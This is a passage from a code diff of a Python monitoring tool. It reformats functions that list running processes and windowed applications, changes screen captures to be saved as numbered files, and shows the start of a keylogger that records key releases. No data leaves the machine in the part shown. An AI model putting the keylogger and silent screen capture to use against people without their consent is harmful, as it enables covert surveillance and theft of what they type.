@@ -13,9 +13,9 @@ def listRunningProcess():
     runningProcess = []
     f = wmi.WMI()
     for process in f.Win32_Process():
-        processInfo = { 'PID': process.ProcessId, 'Name': process.Name}
+        processInfo = {"PID": process.ProcessId, "Name": process.Name}
         runningProcess.append(processInfo)
-    
+
     return runningProcess
 
 
@@ -24,23 +24,27 @@ def listRunningApplication():
     cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Description'
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
     stdout = proc.communicate()
-    
-    for line in stdout[0].decode().split('\n'):
+
+    for line in stdout[0].decode().split("\n"):
         line = line.strip()
         if line:
             runningApp.append(line)
-            
-    return runningApp 
+
+    return runningApp
 
 
 def screenshot():
     screenshotImage = ImageGrab.grab()
     curDir = os.getcwd()
-    screenshotImage.save(os.path.join(curDir, "screenshot.png"))
-    
-    
+    screenshotDir = os.path.join(curDir, "Screenshot")
+    id = len(os.listdir(screenshotDir))
+    name = "screenshot" + str(id) + ".png"
+    screenshotImage.save(os.path.join(screenshotDir, name))
+
+
 def keylogger():
     recorded_keys = []
+
     def on_key_event(e):
         if e.event_type == keyboard.KEY_UP:
             key = e.name
